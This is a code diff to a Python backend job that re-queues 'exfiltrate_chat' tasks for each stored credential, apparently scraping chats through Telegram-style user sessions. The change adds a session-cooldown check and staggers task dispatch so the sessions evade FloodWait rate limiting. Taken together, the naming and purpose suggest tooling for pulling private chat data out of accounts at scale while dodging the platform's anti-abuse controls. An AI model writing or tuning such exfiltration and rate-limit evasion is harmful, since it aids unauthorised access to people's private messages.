@@ -642,12 +642,40 @@ async def _rescrape_active_logic():
     """
     import os
     from app.core.metrics import metrics
+    from app.core.redis_srv import redis_srv
     metrics.inc("rescrape.started")
 
     BATCH_SIZE = int(os.getenv("RESCRAPE_BATCH_SIZE", 50))
+    # Stagger task dispatch: spread BATCH_SIZE tasks across RESCRAPE_SPREAD_SECONDS
+    # so they don't all hit the UserAgent simultaneously and trigger FloodWait.
+    # Default: 50 tasks over 300s = one task every 6s.
+    SPREAD_SECONDS = int(os.getenv("RESCRAPE_SPREAD_SECONDS", 300))
     CURSOR_KEY = "rescrape:cursor:last_id"
 
     broadcaster = get_broadcaster()
+
+    # Guard: if ALL UserAgent sessions are on cooldown, skip this run entirely.
+    # Queueing tasks when the UA is fully restricted just wastes worker slots and
+    # causes noisy "All sessions failed" log spam.
+    from app.utils.helpers import _run_sync
+    ua_sessions_available = False
+    try:
+        import os.path as _osp
+        import glob
+        session_files = glob.glob("/app/sessions/*.session")
+        for sf in session_files:
+            sname = _osp.splitext(_osp.basename(sf))[0]
+            if not redis_srv.is_on_cooldown(f"user_agent:{sname}"):
+                ua_sessions_available = True
+                break
+    except Exception:
+        ua_sessions_available = True  # fail open
+
+    if not ua_sessions_available:
+        msg = "⏳ **Re-scrape**: All UserAgent sessions on FloodWait cooldown — skipping this run to avoid task noise."
+        logger.info(msg)
+        await broadcaster.send_log(msg)
+        return msg
 
     # Read cursor from Redis — empty string means start of table
     last_id = redis_client.get(CURSOR_KEY) or ""
@@ -678,18 +706,21 @@ async def _rescrape_active_logic():
         redis_client.set(CURSOR_KEY, new_cursor)
 
         await broadcaster.send_log(
-            f"🔄 **Re-scrape**: Queuing {len(credentials)} credentials (cursor: ...{new_cursor[-8:]})..."
+            f"🔄 **Re-scrape**: Queuing {len(credentials)} credentials (cursor: ...{new_cursor[-8:]}, "
+            f"staggered over {SPREAD_SECONDS}s)..."
         )
 
         queued = 0
-        for cred in credentials:
+        interval = SPREAD_SECONDS / max(len(credentials), 1)
+        for i, cred in enumerate(credentials):
             try:
-                exfiltrate_chat.delay(cred["id"])
+                # countdown staggers each task: task 0 runs now, task 1 runs in interval*1s, etc.
+                exfiltrate_chat.apply_async(args=[cred["id"]], countdown=int(i * interval))
                 queued += 1
             except Exception as e:
                 logger.error(f"Failed to queue exfiltration for {cred['id']}: {e}")
 
-        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials."
+        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials (spread: ~{interval:.0f}s apart)."
         await broadcaster.send_log(msg)
         return msg
 
